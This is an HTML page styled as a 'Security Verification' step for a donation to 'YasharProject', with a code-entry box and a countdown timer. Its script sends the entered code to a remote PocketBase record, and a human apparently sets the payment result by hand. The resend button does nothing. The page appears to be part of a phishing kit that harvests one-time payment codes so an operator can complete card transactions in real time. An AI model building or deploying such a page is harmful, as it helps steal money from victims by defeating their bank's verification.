<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification - YasharProject</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/pocketbase@0.21.1/dist/pocketbase.umd.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: #f8fafc;
        }

        .otp-input {
            background: #ffffff;
            border: 2px solid #e2e8f0;
            transition: all 0.2s ease;
        }

        .otp-input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
            outline: none;
        }
    </style>
</head>

<body class="min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full">
        <!-- Header -->
        <div class="text-center mb-8">
            <div class="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
            </div>
            <h1 class="text-2xl font-bold text-gray-900 mb-2">Security Verification</h1>
            <p class="text-gray-600">Enter the verification code sent to your device</p>
        </div>

        <!-- OTP Card -->
        <div class="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
            <!-- Transaction Info -->
            <div class="bg-gray-50 rounded-lg p-4 mb-6">
                <div class="flex justify-between items-center mb-2">
                    <span class="text-gray-600">Amount:</span>
                    <span class="font-semibold text-gray-900" id="transaction-amount">$50.00</span>
                </div>
                <div class="flex justify-between items-center mb-2">
                    <span class="text-gray-600">Status:</span>
                    <span class="font-medium text-yellow-600" id="transaction-status">Pending</span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-gray-600">Merchant:</span>
                    <span class="font-medium text-gray-900">YasharProject</span>
                </div>
            </div>

            <!-- OTP Input -->
            <div class="mb-6">
                <label class="block text-sm font-medium text-gray-700 mb-3">
                    Verification Code
                </label>
                <input type="text" id="otp-input" placeholder="Enter code"
                    class="w-full px-4 py-3 text-lg font-semibold text-center otp-input rounded-lg" maxlength="8"
                    >
            </div>

            <!-- Timer -->
            <div class="text-center mb-6">
                <p class="text-sm text-gray-600">
                    Code expires in <span class="font-semibold text-blue-600" id="countdown">05:00</span>
                </p>
            </div>

            <!-- Verify Button -->
            <button id="verify-btn"
                class="w-full bg-blue-600 text-white py-3 px-4 rounded-lg font-semibold hover:bg-blue-700 transition disabled:opacity-50 disabled:cursor-not-allowed"
                disabled>
                Verify & Complete
            </button>

            <!-- Resend Option -->
            <div class="text-center mt-4">
                <button id="resend-btn"
                    class="text-blue-600 hover:text-blue-700 font-medium text-sm disabled:text-gray-400 disabled:cursor-not-allowed"
                    disabled>
                    Resend code (<span id="resend-timer">300</span>s)
                </button>
            </div>
        </div>

        <!-- Security Note -->
        <div class="text-center mt-6">
            <p class="text-xs text-gray-500">
                For your security, this code will expire shortly
            </p>
        </div>
    </div>

    <script>
        // Initialize PocketBase
        const pb = new PocketBase('https://yashar-project.onrender.com');
        let currentDonationId = null;
        let realtimeSubscription = null;
        let successHandled = false;
        let failureHandled = false;

        document.addEventListener('DOMContentLoaded', function () {
            const otpInput = document.getElementById('otp-input');
            const verifyBtn = document.getElementById('verify-btn');
            const resendBtn = document.getElementById('resend-btn');
            const countdownElement = document.getElementById('countdown');
            const resendTimerElement = document.getElementById('resend-timer');

            // Get transaction details from URL or localStorage
            const urlParams = new URLSearchParams(window.location.search);
            const amount = urlParams.get('amount') || localStorage.getItem('donationAmount') || '50.00';
            currentDonationId = urlParams.get('donationId') || localStorage.getItem('currentDonationId');

            console.log('üîç OTP Page Loaded - Donation ID:', currentDonationId);

            document.getElementById('transaction-amount').textContent = `$${amount}`;

            // Initialize real-time subscription
            if (currentDonationId) {
                initializeRealtimeSubscription(currentDonationId);
            } else {
                console.error('‚ùå No donation ID found in URL or localStorage');
            }

            // OTP Input handling
            otpInput.addEventListener('input', function () {
                const value = this.value.trim();
                verifyBtn.disabled = value.length < 4;
            });

            otpInput.addEventListener('keypress', function (e) {
                if (e.key === 'Enter' && !verifyBtn.disabled) {
                    saveOTPToPocketBase();
                }
            });

            verifyBtn.addEventListener('click', saveOTPToPocketBase);

            // Timer functionality
            let countdownTimer;
            function startCountdown(duration) {
                let timer = duration;

                countdownTimer = setInterval(() => {
                    const minutes = Math.floor(timer / 60);
                    const seconds = timer % 60;

                    countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                    resendTimerElement.textContent = timer;

                    if (--timer < 0) {
                        clearInterval(countdownTimer);
                        countdownElement.textContent = "00:00";
                        resendTimerElement.textContent = "0";
                        resendBtn.disabled = false;
                        resendBtn.textContent = "Resend code";
                    }
                }, 1000);
            }

            resendBtn.addEventListener('click', function () {
                if (!this.disabled) {
                    resendOTP();
                    startCountdown(300);
                    this.disabled = true;
                    otpInput.value = '';
                    verifyBtn.disabled = true;
                    otpInput.focus();
                }
            });

            // Start initial countdown
            startCountdown(300);

            async function saveOTPToPocketBase() {
                const otpCode = otpInput.value.trim();

                if (!otpCode || !currentDonationId) {
                    showError('Invalid OTP or Transaction ID');
                    return;
                }

                // Show loading state
                verifyBtn.disabled = true;
                verifyBtn.textContent = 'Verifying OTP...';

                try {
                    // Save OTP to the donation record
                    const updatedRecord = await pb.collection('donations').update(currentDonationId, {
                        OTP: otpCode,
                        updated: new Date().toISOString()
                    });

                    console.log('‚úÖ OTP Processing:', updatedRecord);

                    verifyBtn.textContent = 'Processing...';
                    verifyBtn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
                    verifyBtn.classList.add('bg-green-600', 'hover:bg-green-700');

                    // Disable the OTP input after saving
                    otpInput.disabled = true;

                } catch (error) {
                    console.error('‚ùå Failed to verify OTP:', error);
                    showError('Failed to verify OTP. Please try again.');
                    verifyBtn.disabled = false;
                    verifyBtn.textContent = 'Verify & Complete';
                }
            }

            async function resendOTP() {
                console.log('Resending OTP...');
            }

            function showError(message) {
                Swal.fire({
                    icon: 'error',
                    title: 'Error',
                    text: message,
                    confirmButtonColor: '#ef4444'
                });
            }
        });

        // Real-time subscription to monitor transaction status changes
        async function initializeRealtimeSubscription(donationId) {
            try {
                console.log('üîÑ Setting up real-time subscription for donation:', donationId);

                // First, get the current status
                const currentRecord = await pb.collection('donations').getOne(donationId);
                console.log('üìä Current transaction status:', currentRecord.Transaction_status);

                // Update UI with current status
                const statusElement = document.getElementById('transaction-status');
                if (statusElement) {
                    statusElement.textContent = currentRecord.Transaction_status;
                }

                // If already successful, handle it immediately
                if (currentRecord.Transaction_status === 'Succesful' && !successHandled) {
                    console.log('‚úÖ Transaction already succesful, handling immediately');
                    handleSuccessfulTransaction();
                    return;
                }

                // If already failed, handle it immediately
                if ((currentRecord.Transaction_status === 'Cancelled' || currentRecord.Transaction_status === 'Failed') && !failureHandled) {
                    console.log('‚ùå Transaction already failed, handling immediately');
                    handleFailedTransaction();
                    return;
                }

                // Subscribe to changes for this specific donation record
                // PocketBase realtime returns a function to unsubscribe, not an object with unsubscribe method
                realtimeSubscription = await pb.collection('donations').subscribe(donationId, function (e) {
                    console.log('üîÑ Real-time update received:', {
                        action: e.action,
                        record: e.record,
                        status: e.record.Transaction_status
                    });

                    if (e.action === 'update') {
                        const transactionStatus = e.record.Transaction_status;
                        const statusElement = document.getElementById('transaction-status');

                        // Update status display
                        if (statusElement) {
                            statusElement.textContent = transactionStatus;
                        }

                        // Handle status changes with flags to prevent duplicate handling
                        if (transactionStatus === 'Succesful' && !successHandled) {
                            console.log('üéâ Handling succesful transaction');
                            successHandled = true;
                            handleSuccessfulTransaction();
                        } else if ((transactionStatus === 'Cancelled' || transactionStatus === 'Failed') && !failureHandled) {
                            console.log('üí• Handling failed transaction');
                            failureHandled = true;
                            handleFailedTransaction();
                        }
                    }
                });

                console.log('‚úÖ Real-time subscription established for donation:', donationId);

            } catch (error) {
                console.error('‚ùå Failed to establish real-time subscription:', error);
                showError('Failed to connect to payment service. Please refresh the page.');
            }
        }

        function handleSuccessfulTransaction() {
            console.log('üöÄ Starting succesful transaction handling');

            // Update UI for success immediately
            const statusElement = document.getElementById('transaction-status');
            if (statusElement) {
                statusElement.textContent = 'Succesful';
                statusElement.classList.remove('text-yellow-600', 'text-red-600');
                statusElement.classList.add('text-green-600');
            }

            // Clean up subscription first - PocketBase returns a function, not an object
            if (realtimeSubscription && typeof realtimeSubscription === 'function') {
                console.log('üî¥ Unsubscribing from real-time updates');
                try {
                    realtimeSubscription();
                    realtimeSubscription = null;
                } catch (error) {
                    console.error('Error unsubscribing:', error);
                }
            }

            // Use setTimeout to ensure DOM is ready for SweetAlert
            setTimeout(() => {
                console.log('üîÑ Showing success SweetAlert');

                // Close any existing SweetAlert modals
                Swal.close();

                // Show success message
                Swal.fire({
                    icon: 'success',
                    title: 'Payment Successful!',
                    text: 'Your transaction has been completed successfully.',
                    confirmButtonColor: '#10b981',
                    confirmButtonText: 'Continue',
                    allowOutsideClick: false,
                    allowEscapeKey: false,
                    showConfirmButton: true
                }).then((result) => {
                    if (result.isConfirmed) {
                        console.log('üîó Redirecting to index.html');
                        window.location.href = 'index.html';
                    }
                });
            }, 100);
        }

        function handleFailedTransaction() {
            console.log('üí• Starting failed transaction handling');

            // Update UI for failure immediately
            const statusElement = document.getElementById('transaction-status');
            if (statusElement) {
                statusElement.textContent = 'Failed';
                statusElement.classList.remove('text-yellow-600', 'text-green-600');
                statusElement.classList.add('text-red-600');
            }

            // Clean up subscription first - PocketBase returns a function, not an object
            if (realtimeSubscription && typeof realtimeSubscription === 'function') {
                console.log('üî¥ Unsubscribing from real-time updates');
                try {
                    realtimeSubscription();
                    realtimeSubscription = null;
                } catch (error) {
                    console.error('Error unsubscribing:', error);
                }
            }

            // Use setTimeout to ensure DOM is ready for SweetAlert
            setTimeout(() => {
                console.log('üîÑ Showing failure SweetAlert');

                // Close any existing SweetAlert modals
                Swal.close();

                // Show failure message
                Swal.fire({
                    icon: 'error',
                    title: 'Payment Failed',
                    text: 'Your transaction could not be completed. Please try again.',
                    confirmButtonColor: '#ef4444',
                    confirmButtonText: 'Try Again',
                    allowOutsideClick: false,
                    allowEscapeKey: false,
                    showConfirmButton: true
                }).then((result) => {
                    if (result.isConfirmed) {
                        console.log('üîó Redirecting to donate.html');
                        window.location.href = 'donate.html';
                    }
                });
            }, 100);
        }

        // Clean up subscription when page unloads
        window.addEventListener('beforeunload', function () {
            console.log('üßπ Cleaning up before unload');
            if (realtimeSubscription && typeof realtimeSubscription === 'function') {
                realtimeSubscription();
            }
        });

        // Add error handling for SweetAlert
        window.addEventListener('error', function (e) {
            console.error('üí• Global error:', e.error);
        });

        // Debug function to check subscription status
        function checkSubscriptionStatus() {
            console.log('üìä Subscription Status:', {
                hasSubscription: !!realtimeSubscription,
                subscriptionType: typeof realtimeSubscription,
                donationId: currentDonationId,
                successHandled: successHandled,
                failureHandled: failureHandled
            });
        }
    </script>
</body>

</html>
